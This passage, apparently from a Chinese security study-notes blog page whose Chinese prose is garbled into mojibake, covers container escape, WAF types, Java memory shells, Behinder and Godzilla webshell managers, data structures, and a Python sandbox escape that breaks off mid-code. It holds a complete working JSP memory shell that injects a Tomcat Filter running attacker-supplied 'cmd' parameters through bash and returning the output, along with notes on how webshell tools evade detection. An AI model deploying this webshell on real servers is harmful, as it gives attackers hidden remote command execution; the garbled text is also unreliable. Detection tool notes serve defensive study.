´å®¹å™¨çš„éš”ç¦»ï¼Œè·å–å®¿ä¸»æœºçš„æ§åˆ¶æƒã€‚ä¾‹å¦‚ï¼ŒCVE-2019-5736æ¼æ´å…è®¸æ”»å‡»è€…åœ¨å®¹å™¨å†…éƒ¨é‡å†™å®¿ä¸»æœºä¸Šçš„runcäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä»è€Œåœ¨å®¿ä¸»æœºä¸Šä»¥rootèº«ä»½æ‰§è¡Œå‘½ä»¤ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ç‰¹å®šçš„å®¹å™¨é•œåƒæˆ–execæ“ä½œè·å–å®¿ä¸»æœºruncæ‰§è¡Œæ–‡ä»¶çš„æ–‡ä»¶å¥æŸ„å¹¶ä¿®æ”¹runcçš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œè¿›è€Œå®ç°é€ƒé€¸ã€‚</p><h3 id="å¸¸è§WAFç§ç±»"><a href="#å¸¸è§WAFç§ç±»" class="headerlink" title="å¸¸è§WAFç§ç±»"></a>å¸¸è§WAFç§ç±»</h3><p>å¸¸è§WAFï¼ˆWebåº”ç”¨é˜²ç«å¢™ï¼‰å¯ä»¥åˆ†ä¸ºä»¥ä¸‹å‡ ç±»ï¼š</p><ul><li><strong>äº‘WAF</strong>ï¼šåŸºäºäº‘ç«¯çš„æ£€æµ‹ï¼Œå®‰è£…ç®€å•ï¼Œé€šè¿‡ä¿®æ”¹DNSè§£ææˆ–åœ¨æœåŠ¡å™¨ä¸Šå®‰è£…æ¨¡å—å³å¯ä½¿ç”¨ã€‚ä¾‹å¦‚å®‰å…¨å®ã€åˆ›å®‡ç›¾ã€ç„æ­¦ç›¾ã€è…¾è®¯äº‘ã€ç™¾åº¦äº‘ã€é˜¿é‡Œäº‘ç›¾ç­‰ã€‚</li><li><strong>ç¡¬ä»¶WAF</strong>ï¼šä½¿ç”¨ä¸“é—¨çš„ç¡¬ä»¶è®¾å¤‡å®ç°ï¼Œé˜²æŠ¤èŒƒå›´å¤§ï¼Œé€‚åˆä¼ä¸šçº§åº”ç”¨ã€‚ä¾‹å¦‚ç»¿ç›Ÿã€å®‰æ’ã€é“±è¿…ã€å¤©èä¿¡ã€æ·±ä¿¡æœã€å¯æ˜æ˜Ÿè¾°ã€F5 BIG-IPç­‰ã€‚</li><li><strong>è½¯ä»¶WAF</strong>ï¼šå®‰è£…åœ¨æœåŠ¡å™¨ä¸Šï¼Œæ ¹æ®ç½‘ç«™æµé‡å ç”¨ç›¸åº”å†…å­˜é‡ã€‚ä¾‹å¦‚Dç›¾ã€äº‘é”ã€ç½‘é˜²ã€å®‰å…¨ç‹—ã€æŠ¤å«ç¥ã€æ™ºåˆ›ã€æ‚¬é•œã€UPUPWã€WTS-WAFã€å®‰éª‘å£«ã€dotDefenderç­‰ã€‚</li><li><strong>ç½‘ç«™å†…ç½®WAF</strong>ï¼šåœ¨ç³»ç»Ÿåå°å†…ç½®å®‰å…¨åŠŸèƒ½ï¼Œä¾›ç®¡ç†è€…ä½¿ç”¨ã€‚</li></ul><h3 id="MySQLçš„UAF"><a href="#MySQLçš„UAF" class="headerlink" title="MySQLçš„UAF"></a>MySQLçš„UAF</h3><p>MySQLçš„UAFï¼ˆUse-After-Freeï¼‰æ¼æ´æ˜¯æŒ‡åœ¨å†…å­˜ç®¡ç†è¿‡ç¨‹ä¸­ï¼Œå¯¹è±¡è¢«é‡Šæ”¾åä»è¢«å¼•ç”¨ï¼Œå¯¼è‡´æœªå®šä¹‰è¡Œä¸ºï¼Œå¯èƒ½è¢«æ”»å‡»è€…åˆ©ç”¨æ¥æ‰§è¡Œä»»æ„ä»£ç æˆ–å¯¼è‡´æœåŠ¡å´©æºƒã€‚è¿™ç§æ¼æ´é€šå¸¸æ¶‰åŠå¤æ‚çš„å†…å­˜æ“ä½œå’Œå¹¶å‘é—®é¢˜ã€‚UAFæ¼æ´çš„é˜²å¾¡éœ€è¦ä¸¥æ ¼éµå¾ªå®‰å…¨çš„å†…å­˜ç®¡ç†å®è·µï¼ŒåŠæ—¶åº”ç”¨è¡¥ä¸ï¼Œå¹¶é™åˆ¶ç”¨æˆ·è¾“å…¥å¯¹å†…å­˜æ“ä½œçš„å½±å“ã€‚</p><h3 id="Java-å†…å­˜é©¬åŸç†"><a href="#Java-å†…å­˜é©¬åŸç†" class="headerlink" title="Java å†…å­˜é©¬åŸç†"></a>Java å†…å­˜é©¬åŸç†</h3><p>Java å†…å­˜é©¬æ˜¯ä¸€ç§æ— æ–‡ä»¶æ”»å‡»æ‰‹æ®µï¼Œé€šè¿‡åœ¨å†…å­˜ä¸­ä¿®æ”¹æˆ–åŠ¨æ€æ³¨å†Œæ–°çš„ç»„ä»¶ï¼ˆå¦‚Filterã€Servletç­‰ï¼‰ï¼Œè¾¾åˆ°æ³¨å…¥Webshellçš„ç›®çš„ã€‚è¿™ç§æ”»å‡»æ–¹å¼éšè”½æ€§å¼ºï¼Œå› ä¸ºå†…å­˜é©¬ä»…å­˜åœ¨äºè¿›ç¨‹çš„å†…å­˜ç©ºé—´ä¸­ï¼Œç³»ç»Ÿå±‚é¢çš„å®‰å…¨æ£€æµ‹å·¥å…·éš¾ä»¥æ£€æµ‹åˆ°ã€‚</p><p>Java å†…å­˜é©¬ä»£ç ç¤ºä¾‹<br>ä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„Javaå†…å­˜é©¬ä»£ç ç¤ºä¾‹ï¼Œé€šè¿‡åŠ¨æ€æ³¨å†ŒFilteræ¥å®ç°å‘½ä»¤æ‰§è¡Œï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> contentType=<span class="string">&quot;text/html; charset=UTF-8&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;cyc1ops&quot;</span>;</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext);</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">Configs</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">    Configs.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) Configs.get(standardContext);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (filterConfigs.get(name) == <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">                <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) servletRequest;</span><br><span class="line">                <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>)&#123;</span><br><span class="line">                    <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                    <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,req.getParameter(<span class="string">&quot;cmd&quot;</span>)).start();</span><br><span class="line">                    <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> process.getInputStream().read(bytes);</span><br><span class="line">                    servletResponse.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(bytes,<span class="number">0</span>,len));</span><br><span class="line">                    process.destroy();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">        filterDef.setFilter(filter);</span><br><span class="line">        filterDef.setFilterName(name);</span><br><span class="line">        filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">        standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">        <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">        filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">        filterMap.setFilterName(name);</span><br><span class="line">        filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line"></span><br><span class="line">        standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);</span><br><span class="line"></span><br><span class="line">        filterConfigs.put(name,filterConfig);</span><br><span class="line">        out.print(<span class="string">&quot;Inject Success !&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h3 id="å¦‚ä½•æŸ¥æ€Javaå†…å­˜é©¬"><a href="#å¦‚ä½•æŸ¥æ€Javaå†…å­˜é©¬" class="headerlink" title="å¦‚ä½•æŸ¥æ€Javaå†…å­˜é©¬"></a>å¦‚ä½•æŸ¥æ€Javaå†…å­˜é©¬</h3><p>æŸ¥æ€Javaå†…å­˜é©¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å·¥å…·å’Œæ–¹æ³•ï¼š</p><ul><li><strong>Arthas</strong>ï¼šä¸€æ¬¾å¼€æºçš„Javaè¯Šæ–­å·¥å…·ï¼Œå¯ä»¥åŠ¨æ€è¿½è¸ªJavaä»£ç ï¼Œå®æ—¶ç›‘æ§JVMçŠ¶æ€ï¼Œå¸®åŠ©å‘ç°å†…å­˜é©¬ã€‚</li><li><strong>copagent</strong>ï¼šåŸºäºAlibaba Arthasç¼–å†™çš„å·¥å…·ï¼Œå¯ä»¥åˆ†æJVMä¸­æ‰€æœ‰çš„Classï¼Œæ ¹æ®å±é™©æ³¨è§£å’Œç±»åç­‰ä¿¡æ¯dumpå¯ç–‘çš„ç»„ä»¶ã€‚</li><li><strong>java-memshell-scanner</strong>ï¼šé€šè¿‡Tomcat APIåˆ é™¤æ·»åŠ çš„ç»„ä»¶ï¼Œå¯ä»¥æŸ¥çœ‹æ‰€æœ‰çš„ç»„ä»¶ä¿¡æ¯ï¼Œç»“åˆäººå·¥å®¡æŸ¥å¯¹å†…å­˜é©¬è¿›è¡ŒæŸ¥æ€ã€‚</li></ul><p>å†°èï¼ˆBehinderï¼‰å’Œå“¥æ–¯æ‹‰ï¼ˆGodzillaï¼‰æ˜¯ä¸¤æ¬¾æ¯”è¾ƒæµè¡Œçš„Webshellç®¡ç†å·¥å…·ï¼Œå®ƒä»¬éƒ½é‡‡ç”¨äº†åŠ å¯†é€šä¿¡æŠ€æœ¯æ¥èº²é¿å®‰å…¨æ£€æµ‹ï¼Œä»¥ä¸‹æ˜¯å¯¹å®ƒä»¬åŸç†çš„ç®€è¦ä»‹ç»ï¼š</p><h3 id="å†°èåŸç†"><a href="#å†°èåŸç†" class="headerlink" title="å†°èåŸç†"></a>å†°èåŸç†</h3><ul><li><strong>åŠ å¯†é€šä¿¡</strong>ï¼šå†°èä½¿ç”¨AESåŠ å¯†ç®—æ³•å¯¹é€šä¿¡å†…å®¹è¿›è¡ŒåŠ å¯†ï¼Œå¯†é’¥æ˜¯è¿æ¥å¯†ç çš„32ä½MD5å€¼çš„å‰16ä½ã€‚åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­ï¼Œæ•°æ®å…ˆè¿›è¡ŒAESåŠ å¯†ï¼Œç„¶åè¿›è¡ŒBase64ç¼–ç ã€‚</li><li><strong>åŠ¨æ€å¯†é’¥åå•†</strong>ï¼šå†°èçš„æ—©æœŸç‰ˆæœ¬éœ€è¦å…ˆè·å–æœåŠ¡å™¨å¯†é’¥ï¼Œè€Œ3.0ç‰ˆæœ¬å»é™¤äº†åŠ¨æ€å¯†é’¥åå•†æœºåˆ¶ï¼Œé‡‡ç”¨é¢„å…±äº«å¯†é’¥ï¼Œè½½è·å…¨ç¨‹æ— æ˜æ–‡ï¼Œè¿™æ ·å¯ä»¥é¿å…åœ¨é€šä¿¡è¿‡ç¨‹ä¸­æš´éœ²å¯†é’¥ã€‚</li><li><strong>å†…å­˜é©¬æ³¨å…¥</strong>ï¼šå†°èå¯ä»¥åˆ©ç”¨Javaå†…å­˜é©¬æŠ€æœ¯ï¼Œé€šè¿‡åœ¨å†…å­˜ä¸­åŠ¨æ€æ³¨å†ŒFilterã€Servletç­‰ç»„ä»¶æ¥å®ç°Webshellçš„åŠŸèƒ½ï¼Œè¿™ç§å†…å­˜ä¸­çš„æ¶æ„ä»£ç ä¸ä¼šå†™å…¥ç£ç›˜ï¼Œéš¾ä»¥è¢«ä¼ ç»Ÿçš„å®‰å…¨æ£€æµ‹å·¥å…·å‘ç°ã€‚</li><li><strong>æ”¯æŒå¤šç§Webå®¹å™¨</strong>ï¼šå†°èæ”¯æŒTomcatã€Jettyã€Weblogicç­‰å¤šç§Webå®¹å™¨ï¼Œèƒ½å¤Ÿé€‚åº”ä¸åŒçš„æœåŠ¡å™¨ç¯å¢ƒã€‚</li></ul><h3 id="å“¥æ–¯æ‹‰åŸç†"><a href="#å“¥æ–¯æ‹‰åŸç†" class="headerlink" title="å“¥æ–¯æ‹‰åŸç†"></a>å“¥æ–¯æ‹‰åŸç†</h3><ul><li><strong>å…¨åŠ å¯†æµé‡</strong>ï¼šå“¥æ–¯æ‹‰æ˜¯ä¸€æ¬¾åŸºäºæµé‡ã€HTTPå…¨åŠ å¯†çš„Webshellç®¡ç†å·¥å…·ã€‚å®ƒå¯¹æ‰€æœ‰çš„é€šä¿¡æ•°æ®éƒ½è¿›è¡ŒåŠ å¯†ï¼ŒåŒ…æ‹¬Webshellçš„ä¸Šä¼ ã€æ‰§è¡Œå‘½ä»¤ç­‰æ“ä½œï¼ŒåŠ å¯†æ–¹å¼æ”¯æŒAESç­‰ï¼Œè¿™ä½¿å¾—å…¶é€šä¿¡æµé‡éš¾ä»¥è¢«ä¼ ç»Ÿçš„WAFï¼ˆWebåº”ç”¨é˜²ç«å¢™ï¼‰æ£€æµ‹åˆ°ã€‚</li><li><strong>è‡ªå®šä¹‰é…ç½®</strong>ï¼šå“¥æ–¯æ‹‰æ”¯æŒè‡ªå®šä¹‰Httpå¤´ã€è‡ªå®šä¹‰åŠ å¯†æ–¹å¼ç­‰ï¼Œæ”»å‡»è€…å¯ä»¥æ ¹æ®å®é™…æƒ…å†µçµæ´»é…ç½®ï¼Œå¢åŠ æ£€æµ‹éš¾åº¦ã€‚</li><li><strong>ä¸°å¯Œçš„æ’ä»¶ç³»ç»Ÿ</strong>ï¼šå“¥æ–¯æ‹‰è‡ªå¸¦ä¼—å¤šæ’ä»¶ï¼Œå¦‚å†…å­˜shellæ’ä»¶ç­‰ï¼Œèƒ½å¤Ÿå®ç°æ›´å¤šçš„æ”»å‡»åŠŸèƒ½ï¼Œå¦‚ç«¯å£æ‰«æã€å†…ç½‘æ¸—é€ç­‰ã€‚</li><li><strong>æ”¯æŒå¤šç§ç±»å‹çš„shell</strong>ï¼šå“¥æ–¯æ‹‰æ”¯æŒJSPã€PHPã€ASPç­‰å¤šç§ç±»å‹çš„Webshellï¼Œä¸”è¿™äº›shelléƒ½ç»è¿‡åŠ å¯†å¤„ç†ï¼Œå¯ä»¥ç»•è¿‡å¸‚é¢ä¸Šçš„é™æ€æŸ¥æ€å·¥å…·ã€‚</li></ul><h3 id="çº¢é»‘æ ‘åŸç†"><a href="#çº¢é»‘æ ‘åŸç†" class="headerlink" title="çº¢é»‘æ ‘åŸç†"></a>çº¢é»‘æ ‘åŸç†</h3><p>çº¢é»‘æ ‘æ˜¯ä¸€ç§è‡ªå¹³è¡¡äºŒå‰æŸ¥æ‰¾æ ‘ï¼Œå…·æœ‰ä»¥ä¸‹ç‰¹æ€§ï¼š</p><ul><li>æ¯ä¸ªèŠ‚ç‚¹æ˜¯çº¢è‰²æˆ–é»‘è‰²ã€‚</li><li>æ ¹èŠ‚ç‚¹æ˜¯é»‘è‰²ã€‚</li><li>çº¢è‰²èŠ‚ç‚¹çš„å­èŠ‚ç‚¹å¿…é¡»æ˜¯é»‘è‰²ã€‚</li><li>ä»ä»»ä¸€èŠ‚ç‚¹åˆ°å…¶æ¯ä¸ªå¶å­çš„æ‰€æœ‰è·¯å¾„éƒ½åŒ…å«ç›¸åŒæ•°ç›®çš„é»‘è‰²èŠ‚ç‚¹ã€‚</li><li>æ’å…¥å’Œåˆ é™¤æ“ä½œåä¼šè¿›è¡Œè°ƒæ•´ä»¥ä¿æŒå¹³è¡¡ã€‚</li></ul><h3 id="Javaçš„HashMapç”¨åˆ°çº¢é»‘æ ‘"><a href="#Javaçš„HashMapç”¨åˆ°çº¢é»‘æ ‘" class="headerlink" title="Javaçš„HashMapç”¨åˆ°çº¢é»‘æ ‘"></a>Javaçš„HashMapç”¨åˆ°çº¢é»‘æ ‘</h3><p>Java 8åŠä»¥åç‰ˆæœ¬çš„<code>HashMap</code>åœ¨é“¾è¡¨é•¿åº¦è¶…è¿‡8æ—¶ä¼šå°†é“¾è¡¨è½¬æ¢ä¸ºçº¢é»‘æ ‘ï¼Œä»¥ä¼˜åŒ–æœç´¢æ€§èƒ½ã€‚<code>HashMap</code>çš„åŸºæœ¬ç»“æ„æ˜¯æ•°ç»„+é“¾è¡¨ï¼Œå½“å“ˆå¸Œå†²çªè¾ƒå¤šæ—¶é“¾è¡¨è¿‡é•¿ä¼šå¯¼è‡´æ€§èƒ½ä¸‹é™ï¼Œå› æ­¤å¼•å…¥çº¢é»‘æ ‘æ¥ä¿è¯æ“ä½œçš„å¯¹æ•°æ—¶é—´å¤æ‚åº¦ã€‚</p><h3 id="MySQLçš„ç´¢å¼•ä¸å­˜å‚¨ç»“æ„"><a href="#MySQLçš„ç´¢å¼•ä¸å­˜å‚¨ç»“æ„" class="headerlink" title="MySQLçš„ç´¢å¼•ä¸å­˜å‚¨ç»“æ„"></a>MySQLçš„ç´¢å¼•ä¸å­˜å‚¨ç»“æ„</h3><p>MySQLçš„ç´¢å¼•é€šå¸¸ä½¿ç”¨B+æ ‘ç»“æ„ï¼Œå› ä¸ºB+æ ‘åœ¨ç£ç›˜I&#x2F;Oæ–¹é¢è¡¨ç°è‰¯å¥½ï¼Œé€‚åˆæ•°æ®åº“è¿™ç§éœ€è¦é¢‘ç¹ç£ç›˜æ“ä½œçš„åœºæ™¯ã€‚B+æ ‘çš„å¶å­èŠ‚ç‚¹åŒ…å«æ‰€æœ‰é”®å€¼å’Œæ•°æ®æŒ‡é’ˆï¼Œä¸”å¶å­èŠ‚ç‚¹ä¹‹é—´æœ‰æŒ‡é’ˆç›¸è¿ï¼Œä¾¿äºèŒƒå›´æŸ¥è¯¢ã€‚<br>MySQLçš„å­˜å‚¨ç»“æ„å› å­˜å‚¨å¼•æ“è€Œå¼‚ï¼Œå¸¸è§çš„InnoDBå’ŒMyISAMå¼•æ“å„æœ‰ç‰¹ç‚¹ï¼š</p><ul><li>InnoDBæ”¯æŒäº‹åŠ¡å¤„ç†ã€è¡Œçº§é”å®šå’Œå¤–é”®ç­‰ï¼Œæ•°æ®æŒ‰ä¸»é”®èšé›†å­˜å‚¨ã€‚</li><li>MyISAMæ³¨é‡æ€§èƒ½ï¼Œé€‚ç”¨äºè¯»å¤šå†™å°‘çš„åœºæ™¯ï¼Œä½†ä¸æ”¯æŒäº‹åŠ¡ã€‚</li></ul><h3 id="MySQLä¸ºä»€ä¹ˆè¦ç”¨B-æ ‘"><a href="#MySQLä¸ºä»€ä¹ˆè¦ç”¨B-æ ‘" class="headerlink" title="MySQLä¸ºä»€ä¹ˆè¦ç”¨B+æ ‘"></a>MySQLä¸ºä»€ä¹ˆè¦ç”¨B+æ ‘</h3><p>MySQLç´¢å¼•é€‰ç”¨B+æ ‘çš„åŸå› åŒ…æ‹¬ï¼š</p><ol><li><strong>é«˜æ•ˆèŒƒå›´æŸ¥è¯¢</strong>ï¼šB+æ ‘çš„å¶å­èŠ‚ç‚¹ä¹‹é—´æœ‰æŒ‡é’ˆï¼Œèƒ½å¿«é€Ÿè¿›è¡ŒèŒƒå›´æŸ¥è¯¢ã€‚</li><li><strong>é«˜ç£ç›˜I&#x2F;Oæ•ˆç‡</strong>ï¼šB+æ ‘çš„èŠ‚ç‚¹å­˜å‚¨å¤§é‡é”®å€¼ï¼Œå‡å°‘ç£ç›˜è®¿é—®æ¬¡æ•°ã€‚</li><li><strong>æ•°æ®ç¨³å®šæ€§</strong>ï¼šB+æ ‘çš„ç»“æ„å˜åŒ–è¾ƒå°‘ï¼Œå‡å°‘ç£ç›˜æ“ä½œã€‚</li></ol><h3 id="Pythonæ²™ç®±é€ƒé€¸çš„åŸç†ä¸ç¤ºä¾‹"><a href="#Pythonæ²™ç®±é€ƒé€¸çš„åŸç†ä¸ç¤ºä¾‹" class="headerlink" title="Pythonæ²™ç®±é€ƒé€¸çš„åŸç†ä¸ç¤ºä¾‹"></a>Pythonæ²™ç®±é€ƒé€¸çš„åŸç†ä¸ç¤ºä¾‹</h3><h4 id="æ²™ç®±é€ƒé€¸çš„åŸç†"><a href="#æ²™ç®±é€ƒé€¸çš„åŸç†" class="headerlink" title="æ²™ç®±é€ƒé€¸çš„åŸç†"></a>æ²™ç®±é€ƒé€¸çš„åŸç†</h4><p>Pythonæ²™ç®±é€ƒé€¸æ˜¯æŒ‡åœ¨å—é™çš„æ‰§è¡Œç¯å¢ƒä¸­ï¼Œé€šè¿‡åˆ©ç”¨Pythonçš„æŸäº›ç‰¹æ€§æˆ–æ¼æ´ï¼Œçªç ´é™åˆ¶ï¼Œè®¿é—®åˆ°æ²™ç®±å¤–éƒ¨çš„èµ„æºæˆ–æ‰§è¡Œä»»æ„ä»£ç ã€‚æ²™ç®±ç¯å¢ƒé€šå¸¸ä¼šé™åˆ¶å¯¹æŸäº›æ¨¡å—ã€å‡½æ•°å’Œå†…ç½®åŠŸèƒ½çš„è®¿é—®ï¼Œä½†æ”»å‡»è€…å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼é€ƒé€¸ï¼š</p><ol><li><strong>åˆ©ç”¨åå°„ç‰¹æ€§</strong>ï¼šé€šè¿‡Pythonçš„åå°„æœºåˆ¶è®¿é—®å—é™çš„åŠŸèƒ½ã€‚</li><li><strong>ä½¿ç”¨æ¨¡å—å¯¼å…¥</strong>ï¼šå°è¯•å¯¼å…¥è¢«ç¦æ­¢çš„æ¨¡å—ï¼Œå¦‚<code>os</code>æˆ–<code>subprocess</code>ã€‚</li><li><strong>æ„é€ å¯¹è±¡</strong>ï¼šåˆ©ç”¨è‡ªå®šä¹‰å¯¹è±¡çš„é­”æœ¯æ–¹æ³•ç»•è¿‡ç›´æ¥é™åˆ¶ã€‚</li><li><strong>æ ˆå¸§æ“ä½œ</strong>ï¼šé€šè¿‡æ“ä½œæ ˆå¸§è·å–ä¸Šçº§ä½œç”¨åŸŸçš„å˜é‡å’Œå‡½æ•°ã€‚</li></ol><h4 id="æ²™ç®±é€ƒé€¸ç¤ºä¾‹"><a href="#æ²™ç®±é€ƒé€¸ç¤ºä¾‹" class="headerlink" title="æ²™ç®±é€ƒé€¸ç¤ºä¾‹"></a>æ²™ç®±é€ƒé€¸ç¤ºä¾‹</h4><p>ä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„æ²™ç®±ç¯å¢ƒç¤ºä¾‹ï¼Œä»¥åŠå¦‚ä½•é€ƒé€¸è¿™ä¸ªæ²™ç®±ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">sandboxed_exec</span>(<span class="params">code</span>):</span><br><span class="line">    restricted_globals = &#123;</span><br><span class="line">        <span class="string">&#x27;__builtins__&#x27;</span>: <span class="literal">None</span>  <span class="comment"># ç¦ç”¨å†…ç½®å‡½æ•°</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">exec</span>(code, 